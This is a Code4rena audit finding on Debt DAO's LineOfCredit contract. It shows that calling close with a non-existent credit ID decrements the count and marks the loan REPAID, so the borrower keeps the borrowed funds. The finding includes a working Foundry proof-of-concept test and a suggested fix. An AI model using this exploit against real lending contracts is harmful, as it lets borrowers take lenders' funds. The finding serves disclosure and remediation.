## Tags

- bug
- 3 (High Risk)
- primary issue
- satisfactory
- sponsor confirmed
- selected for report
- H-04

# [Borrower can close a credit without repaying debt](https://github.com/code-423n4/2022-11-debtdao-findings/issues/258) 

# Lines of code

https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L389


# Vulnerability details

## Impact
A borrower can close a credit without repaying the debt to the lender. The lender will be left with a bad debt and the borrower will keep the borrowed amount and the collateral.
## Proof of Concept
The `close` function of `LineOfCredit` doesn't check whether a credit exists or not. As a result, the `count` variable is decreased in the internal `_close` function when the `close` function is called with an non-existent credit ID:
[LineOfCredit.sol#L388](https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L388):
```solidity
function close(bytes32 id) external payable override returns (bool) {
    Credit memory credit = credits[id];
    address b = borrower; // gas savings
    if(msg.sender != credit.lender && msg.sender != b) {
      revert CallerAccessDenied();
    }

    // ensure all money owed is accounted for. Accrue facility fee since prinicpal was paid off
    credit = _accrue(credit, id);
    uint256 facilityFee = credit.interestAccrued;
    if(facilityFee > 0) {
      // only allow repaying interest since they are skipping repayment queue.
      // If principal still owed, _close() MUST fail
      LineLib.receiveTokenOrETH(credit.token, b, facilityFee);

      credit = _repay(credit, id, facilityFee);
    }

    _close(credit, id); // deleted; no need to save to storage

    return true;
}
```

[LineOfCredit.sol#L483](https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L483):
```solidity
function _close(Credit memory credit, bytes32 id) internal virtual returns (bool) {
    if(credit.principal > 0) { revert CloseFailedWithPrincipal(); }

    // return the Lender's funds that are being repaid
    if (credit.deposit + credit.interestRepaid > 0) {
        LineLib.sendOutTokenOrETH(
            credit.token,
            credit.lender,
            credit.deposit + credit.interestRepaid
        );
    }

    delete credits[id]; // gas refunds

    // remove from active list
    ids.removePosition(id);
    unchecked { --count; }

    // If all credit lines are closed the the overall Line of Credit facility is declared 'repaid'.
    if (count == 0) { _updateStatus(LineLib.STATUS.REPAID); }

    emit CloseCreditPosition(id);

    return true;
}
```

Proof of Concept:
```solidity
// contracts/tests/LineOfCredit.t.sol
function testCloseWithoutRepaying_AUDIT() public {
    assertEq(supportedToken1.balanceOf(address(line)), 0, "Line balance should be 0");
    assertEq(supportedToken1.balanceOf(lender), mintAmount, "Lender should have initial mint balance");
      
    _addCredit(address(supportedToken1), 1 ether);

    bytes32 id = line.ids(0);
    assert(id != bytes32(0));

    assertEq(supportedToken1.balanceOf(lender), mintAmount - 1 ether, "Lender should have initial balance less lent amount");
    
    hoax(borrower);
    line.borrow(id, 1 ether);
    assertEq(supportedToken1.balanceOf(borrower), mintAmount + 1 ether, "Borrower should have initial balance + loan");
    
    // The credit hasn't been repaid.
    // hoax(borrower);
    // line.depositAndRepay(1 ether);
    
    hoax(borrower);
    // Closing with a non-existent credit ID.
    line.close(bytes32(uint256(31337)));

    // The debt hasn't been repaid but the status is REPAID.
    assertEq(uint(line.status()), uint(LineLib.STATUS.REPAID));

    // Lender's balance is still reduced by the borrow amount.
    assertEq(supportedToken1.balanceOf(lender), mintAmount - 1 ether);

    // Borrower's balance still includes the borrowed amount.
    assertEq(supportedToken1.balanceOf(borrower), mintAmount + 1 ether);
}
```
## Tools Used
Manual review
## Recommended Mitigation Steps
In the `close` function of `LineOfCredit`, consider ensuring that a credit with the user-supplied ID exists, before closing it.